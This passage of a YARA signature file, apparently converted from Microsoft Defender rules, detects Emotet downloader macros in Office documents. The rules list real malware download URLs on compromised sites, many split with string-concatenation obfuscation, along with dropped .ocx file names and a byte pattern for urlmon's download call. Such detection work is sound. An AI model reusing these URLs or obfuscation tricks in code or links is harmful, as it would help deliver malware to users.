        $x_1_5 = "://w\"&\"w\"&\"w.zv\"&\"desi\"&\"gn.i\"&\"n\"&\"f\"&\"o/co\"&\"mp\"&\"one\"&\"nts/F\"&\"Dz/" ascii //weight: 1
        $x_1_6 = "://w\"&\"olff\"&\"ra\"&\"m.d\"&\"k/_b\"&\"or\"&\"de\"&\"rs/E\"&\"1m\"&\"xE\"&\"XY\"&\"rMH\"&\"F/" ascii //weight: 1
        $x_1_7 = "://m\"&\"ac\"&\"ss\"&\"ol\"&\"ut\"&\"io\"&\"ns.c\"&\"o.u\"&\"k/c\"&\"g\"&\"i-bi\"&\"n/m\"&\"3S\"&\"RM\"&\"IM\"&\"sx\"&\"2A\"&\"Zq\"&\"vgJ/" ascii //weight: 1
        $x_1_8 = "://f\"&\"t\"&\"p.y\"&\"ue\"&\"cm\"&\"r.o\"&\"r\"&\"g/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/F\"&\"a/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AYPD_2147820423_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AYPD!MTB"
        threat_id = "2147820423"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\scd1.ocx" ascii //weight: 1
        $x_1_2 = "\\scd2.ocx" ascii //weight: 1
        $x_1_3 = "\\scd3.ocx" ascii //weight: 1
        $x_1_4 = {75 72 6c 6d 6f 6e [0-3] 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SVS_2147820446_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SVS!MTB"
        threat_id = "2147820446"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://upscalifornia.us/libraries/VDu9kaMu/\"" ascii //weight: 1
        $x_1_2 = "://ftp.yourbankruptcypartner.com/wp-content/ksdtjfFji/\"" ascii //weight: 1
        $x_1_3 = "://webbandi.hu/image/m7IzjWQftQ1Jyw6/\"" ascii //weight: 1
        $x_1_4 = "://zarzamora.com.mx/cgi-bin/hAuGj65SuKr/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVN_2147820458_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVN!MTB"
        threat_id = "2147820458"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//terangindonesia.or.id/libraries/m8FIr/\",\"" ascii //weight: 1
        $x_1_2 = "//tbarnes.co.uk/tbarnes_co_uk/8ai/\",\"" ascii //weight: 1
        $x_1_3 = "//toworks.ca/phpmyadmin/OsVquveuEB/\",\"" ascii //weight: 1
        $x_1_4 = "//kokfinance.nl/wp-admin/99h4oFVMo/\",\"" ascii //weight: 1
        $x_1_5 = "//wordpress.agrupem.com/wp-admin/jimjzu/\",\"" ascii //weight: 1
        $x_1_6 = "//www.aseguradosaldia.com/wp-content/kelQuot9kofUTL90uuE/\",\"" ascii //weight: 1
        $x_1_7 = "//ftp.meconser.com/banner/rrMocScrq7/\",\"" ascii //weight: 1
        $x_1_8 = "//hathaabeach.com/documents/k88rn/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AZPD_2147820480_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AZPD!MTB"
        threat_id = "2147820480"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://w\"&\"eb\"&\"ocu\"&\"lt\"&\"a.c\"&\"o\"&\"m/c\"&\"s\"&\"s/b\"&\"3L\"&\"fo\"&\"oq\"&\"37\"&\"Gl\"&\"4D/" ascii //weight: 1
        $x_1_2 = "://w\"&\"w\"&\"w.i\"&\"ng\"&\"ro\"&\"up\"&\"co\"&\"ns\"&\"ul\"&\"t.c\"&\"o\"&\"m/i\"&\"ma\"&\"ge\"&\"s/r\"&\"1U\"&\"A7\"&\"ZR\"&\"RR\"&\"06/" ascii //weight: 1
        $x_1_3 = "://c\"&\"ho\"&\"be\"&\"ma\"&\"st\"&\"er.c\"&\"o\"&\"m/c\"&\"om\"&\"po\"&\"ne\"&\"nt\"&\"s/H\"&\"KS\"&\"Rj\"&\"eY\"&\"B/" ascii //weight: 1
        $x_1_4 = "://p\"&\"ri\"&\"me\"&\"fi\"&\"nd.c\"&\"o\"&\"m/m\"&\"y_p\"&\"ic\"&\"tu\"&\"re\"&\"s/d\"&\"o\"&\"h/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_STKV_2147820487_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.STKV!MTB"
        threat_id = "2147820487"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://tvstv.yunethosting.rs/nesciuntquos/2SlrSdLBAv7/\"" ascii //weight: 1
        $x_1_2 = "://wahkiulogistics.com.hk/upload/rIpUmi7MrlOc/\"" ascii //weight: 1
        $x_1_3 = "://vanlaereict.nl/domains/T9G5ruQJ/\"" ascii //weight: 1
        $x_1_4 = "://usa-ltd.ie/wp-includes/0x7HPlZ8sGANiI5i/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_STMV_2147820493_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.STMV!MTB"
        threat_id = "2147820493"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://kmodo.us/cgi-bin/D/\"" ascii //weight: 1
        $x_1_2 = "://travel.pkn2.go.th/img/AMqX1nFdEOnmk/\"" ascii //weight: 1
        $x_1_3 = "://trivet.co.jp/css/itmXV55DnDn8MyXdeE8/\"" ascii //weight: 1
        $x_1_4 = "://tryst.cz/sqluploads/qt0ExthG2Nnz/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDEA_2147820503_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDEA!MTB"
        threat_id = "2147820503"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://faisonfilms.com/wp-includes/5dszuc8mMSA4S0W9/" ascii //weight: 1
        $x_1_2 = "://topvipescortsclub.com/assets/eyA58rpFze5Gq/" ascii //weight: 1
        $x_1_3 = "://meconser.com/banner/tP8p/" ascii //weight: 1
        $x_1_4 = "://wp.eryaz.net/bayar1/GQSMsqjA2/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDEB_2147820705_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDEB!MTB"
        threat_id = "2147820705"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://zoompixel.com.br/wp-admin/qHS/" ascii //weight: 1
        $x_1_2 = "://napolni.me/3r/uF/" ascii //weight: 1
        $x_1_3 = "://hosting107068.a2f2a.netcup.net/career/99dtjWgQEmTtpt6C31/" ascii //weight: 1
        $x_1_4 = "://stellarsummit.97.double.in.th/assets/XbmebQRsUVHL0j/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VDSM_2147821014_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VDSM!MTB"
        threat_id = "2147821014"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "w\"&\"e\"&\"b4\"&\"no\"&\"th\"&\"in\"&\"g.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"in/xs\"&\"KuBK\"&\"uQ\"&\"Yh\"&\"Yz/" ascii //weight: 1
        $x_1_2 = "v\"&\"ie\"&\"tr\"&\"ol\"&\"l.v\"&\"n/w\"&\"p-co\"&\"nt\"&\"e\"&\"nt/k\"&\"9t\"&\"STi\"&\"W1\"&\"Co\"&\"sK\"&\"YJOj\"&\"xd/" ascii //weight: 1
        $x_1_3 = "1\"&\"3\"&\"6.2\"&\"4\"&\"3.2\"&\"1\"&\"7.2\"&\"5\"&\"0/a\"&\"pp\"&\"lica\"&\"ti\"&\"on/OP4\"&\"L7\"&\"MV21\"&\"hb\"&\"ub\"&\"4/" ascii //weight: 1
        $x_1_4 = "w\"&\"eb\"&\"pa\"&\"rt\"&\"ne\"&\"r.f\"&\"r/l\"&\"an\"&\"gu\"&\"ag\"&\"e/m\"&\"TbIH\"&\"L2P\"&\"12\"&\"uJ\"&\"3M\"&\"Jl\"&\"L/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVO_2147821061_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVO!MTB"
        threat_id = "2147821061"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//wordpress.agrupem.com/wp-admin/c7WVBumf5iYALK/\",\"" ascii //weight: 1
        $x_1_2 = "//andecam.com.ar/flyer-julio-2017-clientes/1heVrMvqUIgje/\",\"" ascii //weight: 1
        $x_1_3 = "//deadcode200.c1.biz/js/BZjzK85jtrVUyl6cvbj/\",\"" ascii //weight: 1
        $x_1_4 = "//hello-front.thlab.ru/favicon/fssoZs4b/\",\"" ascii //weight: 1
        $x_1_5 = "//mass-gardinen-shop.de/css/AHE8baLiW/\",\"" ascii //weight: 1
        $x_1_6 = "//kbmpti.filkom.ub.ac.id/config/LdgfVAaCy/\",\"" ascii //weight: 1
        $x_1_7 = "//www.hangaryapi.com.tr/wp-admin/E1gb6ognvvn8HX/\",\"" ascii //weight: 1
        $x_1_8 = "/\"&\"/n\"&\"az\"&\"r\"&\"eg\"&\"ha\"&\"d\"&\"i\"&\"r.i\"&\"r/w\"&\"p-i\"&\"n\"&\"c\"&\"l\"&\"u\"&\"d\"&\"e\"&\"s/k\"&\"ai\"&\"S\"&\"E\"&\"oH\"&\"G\"&\"a/\",\"" ascii //weight: 1
        $x_1_9 = "//agir-santeinternationale.com/wp-admin/SUhUrUBrK42N/\",\"" ascii //weight: 1
        $x_1_10 = "//alzheimerzamora.com/libraries/colorbutton/icons/hidpi/AYZRFTHkbj505hA3Aq0p/\",\"" ascii //weight: 1
        $x_1_11 = "//iprd.net.phtemp.com/CFsrjl14PYkCeBda/\",\"" ascii //weight: 1
        $x_1_12 = "/\"&\"/a\"&\"i\"&\"r\"&\"h\"&\"o\"&\"b\"&\"i.c\"&\"o\"&\"m/s\"&\"y\"&\"s\"&\"t\"&\"e\"&\"m/g\"&\"b\"&\"h/\",\"" ascii //weight: 1
        $x_1_13 = "/\"&\"/y\"&\"e\"&\"s\"&\"d\"&\"e\"&\"k\"&\"o.c\"&\"o\"&\"m/s\"&\"t\"&\"a\"&\"t\"&\"s/x\"&\"d\"&\"l\"&\"T/\",\"" ascii //weight: 1
        $x_1_14 = "/\"&\"/a\"&\"k\"&\"d\"&\"a\"&\"l\"&\"a\"&\"r\"&\"a\"&\"b\"&\"i\"&\"c.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/l\"&\"m\"&\"q\"&\"m\"&\"G\"&\"v\"&\"5\"&\"s/\",\"" ascii //weight: 1
        $x_1_15 = "//www.zonetuner.com/licenses/QC4rII7/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVQ_2147821076_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVQ!MTB"
        threat_id = "2147821076"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//w\"&\"w\"&\"w.za\"&\"ch\"&\"bo\"&\"yl\"&\"e.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/5\"&\"sR\"&\"A5\"&\"YI\"&\"wM\"&\"fw\"&\"4c\"&\"gL/\",\"" ascii //weight: 1
        $x_1_2 = "/\"&\"/f\"&\"t\"&\"p.y\"&\"ue\"&\"c\"&\"m\"&\"r.o\"&\"r\"&\"g/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/A\"&\"BE\"&\"mX\"&\"jp\"&\"2y\"&\"ex\"&\"i/\",\"" ascii //weight: 1
        $x_1_3 = "/\"&\"/l\"&\"op\"&\"es\"&\"p\"&\"u\"&\"b\"&\"l\"&\"i\"&\"c\"&\"id\"&\"ad\"&\"e.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/i\"&\"CK\"&\"DP\"&\"Ic\"&\"9M\"&\"Pf\"&\"P5\"&\"MG\"&\"T/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVP_2147821077_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVP!MTB"
        threat_id = "2147821077"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//y\"&\"ak\"&\"os\"&\"ur\"&\"f.c\"&\"o\"&\"m/w\"&\"p-i\"&\"nc\"&\"lu\"&\"de\"&\"s/p\"&\"EI\"&\"Rm\"&\"wL\"&\"Fb/\",\"" ascii //weight: 1
        $x_1_2 = "//f\"&\"t\"&\"p.yu\"&\"ec\"&\"mr.o\"&\"r\"&\"g/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/A\"&\"BE\"&\"mX\"&\"jp\"&\"2y\"&\"ex\"&\"i/\",\"" ascii //weight: 1
        $x_1_3 = "//yahir-fz.com/joy/ukKbmDGhmvSeFPgc/\",\"" ascii //weight: 1
        $x_1_4 = "/\"&\"/a\"&\"ac\"&\"l.c\"&\"o.i\"&\"n/i\"&\"m\"&\"a\"&\"ge\"&\"s/7\"&\"CM\"&\"c2\"&\"Nl\"&\"Oo\"&\"sD\"&\"4p\"&\"n6\"&\"lj\"&\"Dw/\",\"" ascii //weight: 1
        $x_1_5 = "//a\"&\"lp\"&\"s\"&\"a\"&\"w\"&\"n\"&\"i\"&\"n\"&\"g\"&\"s.c\"&\"o.z\"&\"a/l\"&\"o\"&\"g\"&\"s/K\"&\"M\"&\"a\"&\"83/\",\"" ascii //weight: 1
        $x_1_6 = "//a\"&\"lr\"&\"o\"&\"t\"&\"e\"&\"c.c\"&\"o.u\"&\"k/w\"&\"p-i\"&\"n\"&\"c\"&\"lu\"&\"d\"&\"e\"&\"s/D\"&\"D\"&\"2\"&\"j\"&\"w\"&\"g\"&\"a\"&\"z\"&\"T\"&\"K\"&\"s\"&\"p/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDEC_2147821089_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDEC!MTB"
        threat_id = "2147821089"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://n\"&\"at\"&\"ur\"&\"al\"&\"pr\"&\"em\"&\"iu\"&\"mt\"&\"ra\"&\"in\"&\"in\"&\"g.c\"&\"h/S\"&\"zr\"&\"kG\"&\"My\"&\"DK\"&\"D/B\"&\"5sq\"&\"v6\"&\"41\"&\"iB\"&\"ZR\"&\"ad\"&\"B/" ascii //weight: 1
        $x_1_2 = "://w\"&\"w\"&\"w.a\"&\"gr\"&\"of\"&\"ar.n\"&\"e\"&\"t/w\"&\"p-i\"&\"nc\"&\"lu\"&\"de\"&\"s/9\"&\"l/" ascii //weight: 1
        $x_1_3 = "://t\"&\"al\"&\"tu\"&\"s.c\"&\"o.u\"&\"k/Z\"&\"I1\"&\"ML\"&\"TU\"&\"4I\"&\"ww\"&\"3L\"&\"tn\"&\"rA\"&\"Pg/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BBPD_2147821093_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BBPD!MTB"
        threat_id = "2147821093"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\hhwe1.ocx" ascii //weight: 1
        $x_1_2 = "\\hhwe2.ocx" ascii //weight: 1
        $x_1_3 = "\\hhwe3.ocx" ascii //weight: 1
        $x_1_4 = {75 72 6c 6d 6f 6e [0-3] 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_STNV_2147821131_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.STNV!MTB"
        threat_id = "2147821131"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://agir-santeinternationale.com/wp-admin/SUhUrUBrK42N/" ascii //weight: 1
        $x_1_2 = "://alzheimerzamora.com/libraries/colorbutton/icons/hidpi/AYZRFTHkbj505hA3Aq0p/" ascii //weight: 1
        $x_1_3 = "://iprd.net.phtemp.com/CFsrjl14PYkCeBda/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_STOV_2147821143_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.STOV!MTB"
        threat_id = "2147821143"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://hathaabeach.com/documents/xbZxXi/" ascii //weight: 1
        $x_1_2 = "://tekstiluzmangorusu.com/wp-admin/VThSCtERM5Hj/" ascii //weight: 1
        $x_1_3 = "://zhivir.com/wp/yrqupT1QwXuRdX3/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOAH_2147821180_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOAH!MTB"
        threat_id = "2147821180"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":/\"&\"/z\"&\"o\"&\"o\"&\"m\"&\"p\"&\"ix\"&\"el.c\"&\"o\"&\"m.b\"&\"r/w\"&\"p-a\"&\"d\"&\"m\"&\"i\"&\"n/z\"&\"A\"&\"R\"&\"I\"&\"C\"&\"P\"&\"Z\"&\"w\"&\"7\"&\"f\"&\"F/" ascii //weight: 1
        $x_1_2 = "://b\"&\"p\"&\"s\"&\"j\"&\"a\"&\"m\"&\"b\"&\"i.i\"&\"d\"&\"/\"&\"a\"&\"b\"&\"o\"&\"u\"&\"t\"&\"/\"&\"R\"&\"T\"&\"Z\"&\"0\"&\"A\"&\"Q\"&\"1\"&\"/" ascii //weight: 1
        $x_1_3 = ":/\"&\"/h\"&\"os\"&\"t\"&\"i\"&\"n\"&\"g\"&\"10\"&\"70\"&\"6\"&\"8.a\"&\"2\"&\"f\"&\"2\"&\"a.n\"&\"e\"&\"t\"&\"c\"&\"u\"&\"p.n\"&\"e\"&\"t/c\"&\"a\"&\"r\"&\"e\"&\"e\"&\"r/0\"&\"m\"&\"t\"&\"N\"&\"N\"&\"f\"&\"b\"&\"Z/" ascii //weight: 1
        $x_1_4 = "://a\"&\"g\"&\"i\"&\"t\"&\"a\"&\"si.i\"&\"d/m/q\"&\"L\"&\"C\"&\"Z\"&\"W\"&\"t/" ascii //weight: 1
        $x_1_5 = "://d\"&\"jh\"&\"o\"&\"s\"&\"t.n\"&\"l/8\"&\"H\"&\"O\"&\"i\"&\"c\"&\"o\"&\"B\"&\"u\"&\"f\"&\"Q\"&\"N\"&\"b\"&\"j\"&\"b\"&\"M/" ascii //weight: 1
        $x_1_6 = "://c\"&\"o\"&\"m\"&\"p\"&\"u\"&\"t\"&\"e\"&\"r\"&\"c\"&\"o\"&\"l\"&\"l\"&\"e\"&\"g\"&\"i\"&\"a\"&\"t\"&\"e.c\"&\"o\"&\"m.p\"&\"k/w\"&\"p-a\"&\"d\"&\"m\"&\"in/q\"&\"6\"&\"9\"&\"D\"&\"Z\"&\"X\"&\"4\"&\"k\"&\"K\"&\"Z\"&\"6\"&\"s\"&\"s\"&\"R\"&\"Q/" ascii //weight: 1
        $x_1_7 = "://w\"&\"w\"&\"w.a\"&\"dv\"&\"an\"&\"ce\"&\"ne\"&\"t.i\"&\"t/c\"&\"f\"&\"g/9\"&\"8X\"&\"Pj/" ascii //weight: 1
        $x_1_8 = "://a\"&\"n\"&\"a\"&\"m\"&\"a\"&\"f\"&\"e\"&\"g\"&\"a\"&\"r\"&\"c\"&\"i\"&\"a.e\"&\"s/c\"&\"s\"&\"s/V\"&\"G\"&\"B\"&\"J\"&\"h\"&\"j\"&\"p\"&\"u\"&\"1\"&\"9\"&\"e\"&\"C\"&\"b\"&\"q\"&\"8\"&\"g\"&\"b\"&\"Y\"&\"n\"&\"A/" ascii //weight: 1
        $x_1_9 = "://w\"&\"w\"&\"w.a\"&\"lu\"&\"g\"&\"u\"&\"e\"&\"l\"&\"d\"&\"e\"&\"br\"&\"i\"&\"n\"&\"q\"&\"u\"&\"e\"&\"d\"&\"o\"&\"s.b\"&\"a\"&\"r\"&\"u\"&\"e\"&\"r\"&\".b\"&\"r/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/E\"&\"W\"&\"2\"&\"3\"&\"r\"&\"C\"&\"3\"&\"i\"&\"i\"&\"1\"&\"X\"&\"X/" ascii //weight: 1
        $x_1_10 = ":\"&\"/\"&\"/c\"&\"ed\"&\"ec\"&\"o.e\"&\"s/j\"&\"s/n\"&\"7\"&\"4f\"&\"S/" ascii //weight: 1
        $x_1_11 = ":\"&\"/\"&\"/b\"&\"al\"&\"ti\"&\"cc\"&\"on\"&\"tr\"&\"ol\"&\"bd.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/G\"&\"u0\"&\"xn\"&\"o0\"&\"kIs\"&\"sG\"&\"JF\"&\"8/" ascii //weight: 1
        $x_1_12 = "://f\"&\"ik\"&\"ti.b\"&\"e\"&\"m.g\"&\"un\"&\"ad\"&\"ar\"&\"ma.a\"&\"c.i\"&\"d/S\"&\"D\"&\"M/q\"&\"Ne\"&\"MU\"&\"e2\"&\"Rv\"&\"xd\"&\"vu\"&\"Rl\"&\"f/" ascii //weight: 1
        $x_1_13 = "://w\"&\"w\"&\"w.ca\"&\"re\"&\"of\"&\"u.c\"&\"o\"&\"m/P\"&\"HP\"&\"E\"&\"xc\"&\"el/s\"&\"Q7\"&\"8B\"&\"ed\"&\"ri\"&\"bN\"&\"JZ\"&\"bG\"&\"Yj/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_CCPD_2147821343_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.CCPD!MTB"
        threat_id = "2147821343"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\xgev1.ocx" ascii //weight: 1
        $x_1_2 = "\\xgev2.ocx" ascii //weight: 1
        $x_1_3 = "\\xgev3.ocx" ascii //weight: 1
        $x_1_4 = {75 72 6c 6d 6f 6e [0-3] 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVR_2147821348_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVR!MTB"
        threat_id = "2147821348"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//www.chasingmavericks.co.ke/agendaafrikadebates.co.ke/QznOFMKV9R/\",\"" ascii //weight: 1
        $x_1_2 = "//www.buddymorel.com/AoNghcuIc6q7BEKp4/\",\"" ascii //weight: 1
